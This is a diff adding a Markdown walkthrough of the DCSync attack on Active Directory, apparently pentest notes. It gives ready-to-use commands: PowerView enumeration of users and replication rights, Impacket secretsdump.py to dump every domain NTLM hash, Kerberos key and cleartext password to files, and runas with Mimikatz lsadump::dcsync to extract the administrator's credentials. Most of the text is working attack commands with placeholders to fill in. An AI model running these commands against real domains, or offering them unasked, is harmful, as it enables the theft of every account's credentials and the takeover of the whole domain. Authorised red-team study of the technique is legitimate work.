@@ -1,0 +1,92 @@
+# Domain Controller Synchronization (dcsync)
+## Overview
+**DCSync** is an attack that leverages the Directory Replication Service Remote Protocol (DRSR) to impersonate a Domain Controller (DC) and request replication of password data from Active Directory (AD). By abusing the extended rights (specifically, the _DS-Replication-Get-Changes_ and _DS-Replication-Get-Changes-All_ permissions), an attacker can retrieve password hashes (and sometimes even cleartext passwords) for AD accounts.
+### 1. Reconnaissance and User Enumeration
+
+**Goal:** Identify the target user and verify their group memberships.
+**Sample Command (using PowerView in PowerShell):**
+
+```powershell
+Get-DomainUser -Identity adunn | Select-Object samaccountname, objectsid, memberof, useraccountcontrol | Format-List
+```
+
+- **What It Does:** Retrieves details about the user (here, “adunn”), including the SID, group memberships, and account control settings.
+
+---
+
+### 2. Verify Replication Rights
+
+**Goal:** Confirm that the target (or another account you control) has the required replication privileges.
+
+**Sample Command (using PowerView):**
+
+```powershell
+$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"  # Replace with the actual SID
+Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
+    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
+    Where-Object { $_.SecurityIdentifier -match $sid } |
+    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
+    Format-List
+```
+
+- **What It Does:** Scans the ACLs on the domain object (e.g., `DC=yourdomain,DC=com`) and filters for ACEs related to replication. Check for entries such as `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` for the target SID.
+
+---
+
+### 3. Executing the DCSync Attack with Impacket’s secretsdump.py
+
+**Goal:** Request replication from the DC and extract sensitive credential data.
+
+**Sample Command (from a Linux or Windows system with Python and Impacket installed):**
+
+```bash
+secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
+```
+
+- **Parameters:**
+    - `YOURDOMAIN`: Replace with your actual domain name.
+    - `targetUser`: The username that has replication privileges.
+    - `targetIP`: The IP address of the domain controller.
+- **What It Does:** Initiates a replication request mimicking a DC. It writes out the NTLM hashes, Kerberos keys, and, if applicable, cleartext passwords to files prefixed with `domain_hashes`.
+
+**After Running, List the Files:**
+
+```bash
+ls domain_hashes*
+```
+
+- **Expected Files:**
+    - `domain_hashes.ntds` – Contains NTLM hashes.
+    - `domain_hashes.ntds.kerberos` – Contains Kerberos keys.
+    - `domain_hashes.ntds.cleartext` – Contains any cleartext credentials (if reversible encryption is enabled).
+
+---
+
+### 4. Executing the DCSync Attack with Mimikatz
+
+**Goal:** Use Mimikatz to request replication data from the DC in-memory.
+#### 4.1 Launch a Privileged PowerShell Session
+
+**Using runas.exe to open a session as the target user:**
+
+```cmd
+runas /netonly /user:YOURDOMAIN\targetUser powershell
+```
+
+- **Enter the password** when prompted.
+
+#### 4.2 Run Mimikatz in the Elevated Session
+
+**Start Mimikatz:**
+
+```powershell
+.\mimikatz.exe
+```
+
+**Inside Mimikatz, run the DCSync command:**
+
+```mimikatz
+lsadump::dcsync /domain:YOURDOMAIN.LOCAL /user:YOURDOMAIN\administrator
+```
+
+- **What It Does:** Requests replication data for the `administrator` account (or another account of your choice) from the domain controller. Mimikatz will display information including the NTLM hash and other credential details.
